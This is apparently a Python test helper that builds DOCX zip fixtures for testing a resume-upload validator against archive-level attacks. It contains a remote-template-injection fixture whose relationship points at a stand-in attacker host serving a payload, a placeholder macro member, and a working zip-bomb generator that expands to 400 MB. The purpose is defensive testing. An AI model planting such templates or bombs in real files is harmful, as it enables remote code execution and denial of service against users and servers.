"""
Minimal DOCX construction for tests — tests/docx_builder.py

A DOCX IS A ZIP, and that is the whole reason this file exists. Every attack the upload
path has to survive on this format is a property of the archive rather than of the
document: a macro is an extra member (`word/vbaProject.bin`), a remote-template injection
is an external Target in a `.rels` member, and a decompression bomb is one member with a
pathological ratio. None of those can be expressed by handing python-docx a Document
object, so the fixtures are built at the zip level.

`valid_docx` produces the smallest archive python-docx will actually open — a
`[Content_Types].xml`, the root relationships, and `word/document.xml`. That matters for
the bomb fixture in particular: an archive that python-docx refuses for being malformed
proves nothing about decompression, because the parser never got as far as decompressing.
"""

from __future__ import annotations

import io
import zipfile

_CONTENT_TYPES = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"""

#: The content type of a MACRO-ENABLED document. Word uses this for .docm; a file declaring
#: it while named .docx is claiming one thing in its name and another in its manifest.
_CONTENT_TYPES_MACRO = _CONTENT_TYPES.replace(
    b"wordprocessingml.document.main+xml",
    b"wordprocessingml.document.macroEnabled.main+xml",
).replace(
    b'<Default Extension="xml"',
    b'<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>\n'
    b'  <Default Extension="xml"',
)

_ROOT_RELS = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"""


def _document_xml(text: str) -> bytes:
    escaped = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        b"<w:body><w:p><w:r><w:t>" + escaped.encode("utf-8") + b"</w:t></w:r></w:p></w:body>"
        b"</w:document>"
    )


def valid_docx(
    text: str = "Resume",
    *,
    extra_members: dict[str, bytes] | None = None,
    macro_enabled: bool = False,
    compression: int = zipfile.ZIP_DEFLATED,
) -> bytes:
    """The smallest archive python-docx will open, plus whatever a fixture wants to add."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression) as archive:
        archive.writestr(
            "[Content_Types].xml", _CONTENT_TYPES_MACRO if macro_enabled else _CONTENT_TYPES
        )
        archive.writestr("_rels/.rels", _ROOT_RELS)
        archive.writestr("word/document.xml", _document_xml(text))
        for name, payload in (extra_members or {}).items():
            archive.writestr(name, payload)
    return buffer.getvalue()


def docx_with_macro(text: str = "Resume") -> bytes:
    """A macro-bearing archive: `word/vbaProject.bin` is where Word keeps VBA."""
    return valid_docx(
        text,
        extra_members={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0" + b"MACRO" * 64},
        macro_enabled=True,
    )


def docx_with_remote_template(url: str = "http://attacker.example/payload.dotm") -> bytes:
    """
    An external `attachedTemplate` relationship — remote template injection.

    Word resolves the Target over the network when the document opens, which is the
    mechanism behind a well-known family of Office exploits. Nothing in a resume needs it.
    """
    rels = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="' + url.encode() + b'" TargetMode="External"/>'
        b"</Relationships>"
    )
    return valid_docx(extra_members={"word/_rels/settings.xml.rels": rels})


def zip_bomb_docx(uncompressed_bytes: int = 400 * 1024 * 1024) -> bytes:
    """
    A VALID docx whose `word/document.xml` decompresses to `uncompressed_bytes`.

    Valid on purpose. An archive python-docx rejects as malformed proves nothing about
    decompression, because the parser stops before it decompresses anything — so a bomb
    fixture that is also broken is a test that passes for the wrong reason.
    """
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
        archive.writestr("[Content_Types].xml", _CONTENT_TYPES)
        archive.writestr("_rels/.rels", _ROOT_RELS)
        # A run of one byte compresses to almost nothing and expands to all of it.
        archive.writestr("word/document.xml", b"\x00" * uncompressed_bytes)
    return buffer.getvalue()
